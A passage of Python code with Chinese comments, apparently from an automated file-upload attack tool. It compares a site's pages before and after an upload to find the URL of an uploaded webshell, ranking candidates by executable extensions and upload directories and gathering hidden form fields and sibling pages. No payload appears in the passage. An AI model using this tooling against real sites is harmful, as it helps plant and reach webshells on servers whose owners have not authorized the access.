                    context.add_cookies(pw_cookies)

                page = context.new_page()

                # 定义网络请求拦截回调
                def handle_response(response):
                    """捕获所有响应 URL"""
                    url = response.url
                    # 排除一些明显的静态资源（框架、库等）
                    exclude_keywords = [
                        'jquery', 'bootstrap', 'sweetalert', 'datatables',
                        'vendor/', 'cdn', 'jsdelivr', 'google-analytics',
                        'facebook', 'twitter', 'gtag', 'analytics'
                    ]
                    if not any(kw in url.lower() for kw in exclude_keywords):
                        network_resources.add(url)

                page.on("response", handle_response)

                try:
                    # 第一次加载页面
                    page.goto(target_url, wait_until="networkidle", timeout=15000)
                    page.wait_for_timeout(1500)  # 等待 JS 渲染

                    # 主动刷新页面（模拟 F5），触发数据重新加载
                    page.reload(wait_until="networkidle", timeout=15000)
                    page.wait_for_timeout(2000)  # 等待数据重新加载

                    # 提取 DOM 中的链接（img src, a href 等）
                    dom_links = self._extract_dom_links(page)

                except Exception as e:
                    print(f"      [Playwright Refresh] 页面加载异常: {e}")
                finally:
                    browser.close()

        except ImportError:
            print(f"      [Playwright Refresh] Playwright 未安装，跳过")
        except Exception as e:
            print(f"      [Playwright Refresh] 捕获失败: {e}")

        return network_resources, dom_links

    def _extract_dom_links(self, page) -> Set[str]:
        """
        从 Playwright 页面中提取 DOM 链接。

        提取：
        - img src
        - a href
        - script src
        - link href
        - data-src, data-url 等自定义属性

        Args:
            page: Playwright Page 对象

        Returns:
            Set[str]: 提取到的链接集合
        """
        links = set()

        try:
            # 提取 img src
            img_srcs = page.eval_on_selector_all('img[src]', 'els => els.map(el => el.src)')
            links.update(img_srcs)

            # 提取 a href
            a_hrefs = page.eval_on_selector_all('a[href]', 'els => els.map(el => el.href)')
            links.update(a_hrefs)

            # 提取 script src
            script_srcs = page.eval_on_selector_all('script[src]', 'els => els.map(el => el.src)')
            links.update(script_srcs)

            # 提取 link href
            link_hrefs = page.eval_on_selector_all('link[href]', 'els => els.map(el => el.href)')
            links.update(link_hrefs)

            # 提取 data-src（懒加载图片）
            data_srcs = page.eval_on_selector_all('[data-src]', 'els => els.map(el => el.dataset.src)')
            links.update([src for src in data_srcs if src])

            # 提取 data-url
            data_urls = page.eval_on_selector_all('[data-url]', 'els => els.map(el => el.dataset.url)')
            links.update([url for url in data_urls if url])

        except Exception as e:
            print(f"      [DOM Extract] 提取 DOM 链接失败: {e}")

        return links

    def _detect_new_resources_via_playwright(self, observation_pages: List[str],
                                              baseline_resources: Set[str],
                                              filename: str) -> Optional[str]:
        """
        使用 Playwright 检测上传后页面加载的新资源。

        适用于：
        - 新上传的数据条目（列表中显示新图片）
        - 更新已有数据条目（替换旧图片，列表中显示新图片）
        - 服务器重命名文件（无法通过文件名匹配）

        通过对比上传前后的网络请求资源，找出新增的资源 URL。

        增强功能：
        - 主动刷新页面（模拟 F5），触发数据重新加载
        - 等待 JS 渲染完成
        - 提取 DOM 中的 img src、a href 等资源

        Args:
            observation_pages: 要检查的页面列表（如列表页、详情页）
            baseline_resources: 上传前捕获的资源 URL 集合
            filename: 上传的文件名（用于匹配）

        Returns:
            Optional[str]: 找到的 webshell URL，如果没找到返回 None
        """
        if not observation_pages:
            return None

        print(f"      [Playwright Detect] 使用 Playwright 检测新加载的资源...")

        # 上传后重新捕获资源（包括刷新页面）
        after_resources = set()
        after_dom_links = set()

        for page_url in observation_pages:
            try:
                # 捕获网络资源
                resources, dom_links = self._playwright_capture_with_refresh(
                    page_url,
                    self.requester.session.cookies
                )
                after_resources.update(resources)
                after_dom_links.update(dom_links)
            except Exception as e:
                print(f"      [Playwright Detect] 捕获页面 {page_url} 失败: {e}")

        # 找出新增的资源
        new_resources = after_resources - baseline_resources
        new_dom_links = after_dom_links - baseline_resources  # DOM 中的新链接

        if not new_resources and not new_dom_links:
            print(f"      [Playwright Detect] 未发现新增资源")
            return None

        print(f"      [Playwright Detect] 发现 {len(new_resources)} 个新增网络资源，{len(new_dom_links)} 个新增 DOM 链接")

        # 从新增资源中筛选可能是 webshell 的 URL
        shell_extensions = ['.php', '.phtml', '.php3', '.php4', '.php5', '.phar',
                           '.jsp', '.jspx', '.asp', '.aspx']
        upload_dirs = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
                      '/attachments/', '/user_files/', '/data/', '/storage/']

        # 优先级 1: 上传目录 + 可执行扩展名（网络资源）
        for url in sorted(new_resources):
            url_lower = url.lower()
            if any(ud in url_lower for ud in upload_dirs):
                if any(ext in url_lower for ext in shell_extensions):
                    print(f"      [Playwright Detect] 找到可疑资源: {url}")
                    return url

        # 优先级 2: 上传目录 + 可执行扩展名（DOM 链接）
        for url in sorted(new_dom_links):
            url_lower = url.lower()
            if any(ud in url_lower for ud in upload_dirs):
                if any(ext in url_lower for ext in shell_extensions):
                    print(f"      [Playwright Detect] DOM 中找到可疑资源: {url}")
                    return url

        # 优先级 3: 任何可执行扩展名
        for url in sorted(new_resources):
            url_lower = url.lower()
            if any(ext in url_lower for ext in shell_extensions):
                print(f"      [Playwright Detect] 找到可执行资源: {url}")
                return url

        # 优先级 3: 上传目录中的任何资源（可能是图片伪装）
        for url in sorted(new_resources):
            url_lower = url.lower()
            if any(ud in url_lower for ud in upload_dirs):
                print(f"      [Playwright Detect] 找到上传目录资源: {url}")
                return url

        # 优先级 4: DOM 链接中的上传目录资源
        for url in sorted(new_dom_links):
            url_lower = url.lower()
            if any(ud in url_lower for ud in upload_dirs):
                print(f"      [Playwright Detect] DOM 中找到上传目录资源: {url}")
                return url

        return None

    def _build_observation_pages(self, source_page: str, url: str, action_url: str, form: Dict[str, Any]) -> List[str]:
        """构建观察页面池。"""
        pages = set([source_page, url, action_url])
        if "?" in source_page:
            pages.add(source_page.split("?")[0])
        if form.get("referer_url"):
            pages.add(form.get("referer_url"))
        for page_url in [url, form.get("referer_url"), form.get("found_on_page")]:
            if page_url:
                    parent_dir = urllib.parse.urljoin(page_url, ".")
                    if parent_dir: pages.add(parent_dir)

        # 自动发现同级页面（如从 update.php 推断出 list.php）
        sibling_pages = self._discover_sibling_pages(source_page or action_url)
        pages.update(sibling_pages)

        res = [p for p in pages if p]
        return res[:15]  # 增加到 15 个，覆盖更多页面

    def _discover_sibling_pages(self, current_page: str) -> Set[str]:
        """
        自动发现同级页面。

        例如：
        - 从 /admin/update.php 推断出 /admin/list.php, /admin/index.php
        - 从 /setting/Update_CustomerManagement.php 推断出 /setting/CustomerList.php

        通过分析页面中的链接，找出同目录下的其他页面。

        Args:
            current_page: 当前页面 URL

        Returns:
            Set[str]: 发现的同级页面 URL 集合
        """
        if not current_page:
            return set()

        sibling_pages = set()

        try:
            # 获取当前页面 HTML
            resp = self.requester.get(current_page)
            if not resp or not resp.text:
                return set()

            # 提取当前页面的目录
            parsed = urllib.parse.urlparse(current_page)
            current_dir = parsed.path.rsplit('/', 1)[0] + '/' if '/' in parsed.path else '/'
            current_domain = f"{parsed.scheme}://{parsed.netloc}"

            # 提取页面中的所有链接
            soup = BeautifulSoup(resp.text, "html.parser")
            for a_tag in soup.find_all('a', href=True):
                href = a_tag['href']

                # 跳过锚点、JavaScript、邮件链接
                if href.startswith('#') or href.startswith('javascript:') or href.startswith('mailto:'):
                    continue

                # 转换为绝对 URL
                full_url = urllib.parse.urljoin(current_page, href)
                parsed_link = urllib.parse.urlparse(full_url)

                # 只保留同域名、同目录的链接
                link_domain = f"{parsed_link.scheme}://{parsed_link.netloc}"
                link_dir = parsed_link.path.rsplit('/', 1)[0] + '/' if '/' in parsed_link.path else '/'

                if link_domain == current_domain and link_dir == current_dir:
                    # 排除当前页面本身
                    if full_url != current_page:
                        # 只保留 .php, .html, .aspx 等页面
                        path_lower = parsed_link.path.lower()
                        if any(ext in path_lower for ext in ['.php', '.html', '.htm', '.aspx', '.jsp']):
                            sibling_pages.add(full_url)

            if sibling_pages:
                print(f"      [Sibling Discovery] 发现 {len(sibling_pages)} 个同级页面: {list(sibling_pages)[:5]}")

        except Exception as e:
            print(f"      [Sibling Discovery] 发现同级页面失败: {e}")

        return sibling_pages

    def _collect_baseline_links(self, observation_pages: List[str]) -> Set[str]:
        """获取 DOM 基线链接。"""
        baseline_links = set()
        for obs_page in observation_pages:
            try:
                    html_text = self.requester.fetch_rendered_html(obs_page)
                    if html_text:
                        baseline_links.update(self._extract_all_links(html_text))
            except Exception:
                    pass
        return baseline_links

    def _discover_upload_directories(self, observation_pages: List[str]) -> List[str]:
        """
        从页面中发现上传目录模式。

        扫描页面上所有 <img src>、<a href> 等链接，提取出文件存放目录。
        核心逻辑：任何包含图片文件（jpg/png/gif）的目录都可能是上传目录，
        不再依赖硬编码的模式列表。

        同时处理相对路径（如 ../logo/xxx.jpg）→ 解析为绝对 URL。
        """
        upload_dirs = set()
        # 图片扩展名：包含图片的目录大概率是上传目录
        image_exts = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.svg'}
        # 保留硬编码模式作为兜底（用于 a href 等非图片链接）
        upload_dir_patterns = ['/uploads/', '/files/', '/tmp/', '/upload/', '/media/',
                               '/attachments/', '/user_files/', '/data/', '/storage/',
                               '/images/', '/img/', '/assets/', '/resources/',
                               '/logo/', '/logos/', '/avatars/', '/photos/',
                               '/pictures/', '/gallery/', '/content/']

        for obs_page in observation_pages:
            try:
                html_text = self.requester.fetch_rendered_html(obs_page)
                if not html_text:
                    continue

                # 提取所有链接
                all_links = self._extract_all_links(html_text)

                for link in all_links:
                    # 解析相对路径为绝对 URL
                    resolved = urllib.parse.urljoin(obs_page, link)
                    path_part = urllib.parse.urlparse(resolved).path  # 去掉 scheme/netloc/query
                    if not path_part or '/' not in path_part:
                        continue

                    path_lower = path_part.lower()
                    filename = path_part.rsplit('/', 1)[-1].lower()
                    _, ext = os.path.splitext(filename)

                    # 策略 1: 文件是图片 → 其所在目录一定是上传目录（最高优先级）
                    if ext in image_exts:
                        dir_path = path_part.rsplit('/', 1)[0] + '/'
                        upload_dirs.add(dir_path)
                        continue

                    # 策略 2: 路径匹配已知上传目录模式
                    for pattern in upload_dir_patterns:
                        if pattern in path_lower:
                            dir_path = path_part.rsplit('/', 1)[0] + '/'
                            upload_dirs.add(dir_path)
                            break

            except Exception as e:
                print(f"      [UploadDir Discovery] 扫描页面失败 {obs_page}: {e}")

        # 按优先级排序：包含图片扩展名的目录优先（说明该目录确实在存储上传文件）
        priority_dirs = []
        fallback_dirs = []
        common_patterns = ['/uploads/', '/files/', '/upload/', '/media/',
                           '/attachments/', '/logo/', '/images/', '/img/']

        for d in sorted(upload_dirs):
            # 检查目录中是否确实有图片文件（通过访问目录或已知 img src 确认）
            if any(p in d for p in common_patterns):
                priority_dirs.append(d)
            else:
                fallback_dirs.append(d)

        result = priority_dirs + fallback_dirs

        if result:
            print(f"      [UploadDir Discovery] 发现 {len(result)} 个上传目录: {result[:10]}")

        return result[:15]  # 最多返回 15 个

    def _extract_extra_form_fields(self, source_page: str, action_url: str) -> Dict[str, str]:
        """提取普通隐藏字段。"""
        form_data = {}
        try:
            resp = self.requester.get(source_page)
            if resp:
                    soup = BeautifulSoup(resp.text, "html.parser")
                    for f_tag in soup.find_all("form"):
                        if f_tag.get("action", "") in action_url or action_url in f_tag.get("action", ""):
                            for inp in f_tag.find_all("input"):
                                if inp.get("type", "text") != "file" and inp.get("name"):
                                    form_data[inp["name"]] = inp.get("value", "test_val")
                            break
        except Exception:
            pass
        return form_data

    def _extract_urls_from_json(self, obj: Any, depth: int = 0) -> List[str]:
        """
        递归提取 JSON 对象中所有类 URL 的字符串。
        """
        if depth > 10:
            return []
        urls: List[str] = []
        if isinstance(obj, dict):
            for k, v in obj.items():
                    if isinstance(v, str) and ('/' in v or 'http' in v.lower()):
                        urls.append(v)
                    else:
                        urls.extend(self._extract_urls_from_json(v, depth + 1))
        elif isinstance(obj, list):
            for item in obj:
                    urls.extend(self._extract_urls_from_json(item, depth + 1))
        return urls
